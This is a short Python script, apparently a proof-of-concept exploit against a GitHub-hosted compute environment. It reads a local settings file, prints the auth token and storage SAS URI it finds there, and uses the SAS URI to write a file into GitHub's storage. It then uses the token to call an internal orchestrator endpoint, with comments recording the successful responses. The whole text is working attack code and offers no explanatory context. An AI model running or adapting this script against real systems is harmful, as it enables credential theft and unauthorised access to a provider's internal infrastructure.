import json, base64, urllib.request
cfg = json.load(open("/opt/hca/.settings"))
print("keys:", list(cfg.keys()))
print("jwt:", base64.b64encode(cfg["authToken"].encode()).decode())
print("sas:", cfg["diagnosticsSasUri"])

# use the SAS to write into GitHub's own storage
c, q = cfg["diagnosticsSasUri"].split("?", 1)
req = urllib.request.Request(c + "/proof.txt?" + q,
        headers={"x-ms-blob-type": "BlockBlob"}, method="PUT", data=b"hello\n")
print("PUT ->", urllib.request.urlopen(req).status)          # 201

# use the JWT against GitHub's internal orchestrator
req = urllib.request.Request(cfg["schedulerApiUrl"].rstrip("/") + "/trace",
        headers={"Authorization": cfg["authToken"],
                 "Content-Type": "application/json"}, method="POST", data=b"[]")
r = urllib.request.urlopen(req)
print("trace ->", r.status, r.headers.get("x-github-backend"))  # 200 Kubernetes